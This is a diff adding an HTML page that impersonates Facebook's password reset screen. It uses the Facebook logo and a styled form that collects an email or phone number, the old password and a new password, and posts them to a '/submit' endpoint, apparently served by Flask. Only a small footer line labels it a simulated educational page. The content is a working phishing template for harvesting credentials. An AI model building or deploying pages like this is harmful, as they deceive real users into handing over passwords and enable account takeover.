@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Facebook - Reset Password</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .reset-container {
+      background-color: #fff;
+      padding: 40px 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 360px;
+      text-align: center;
+    }
+    .reset-container img {
+      width: 160px;
+      margin-bottom: 20px;
+    }
+    .reset-container h2 {
+      font-size: 20px;
+      margin-bottom: 24px;
+      color: #1c1e21;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 15px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .disclaimer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="reset-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" alt="Facebook Logo" />
+    <h2>Reset Your Facebook Password</h2>
+
+    <form action="/submit" method="POST">
+      <input type="text" name="facebook_email" placeholder="Email or Phone" required />
+      <input type="password" name="facebook_old_password" placeholder="Old Password" required />
+      <input type="password" name="facebook_new_password" placeholder="New Password" required />
+      <input type="password" name="facebook_confirm_password" placeholder="Confirm New Password" required />
+      <!-- Hidden input to tell Flask which confirmation page to load after submission -->
+      <input type="hidden" name="redirect_to" value="fb_reset_conf.html" />
+      <button type="submit">Reset Password</button>
+    </form>
+
+    <div class="disclaimer">
+      This is a simulated page for educational purposes only.
+    </div>
+  </div>
+
+</body>
+</html>
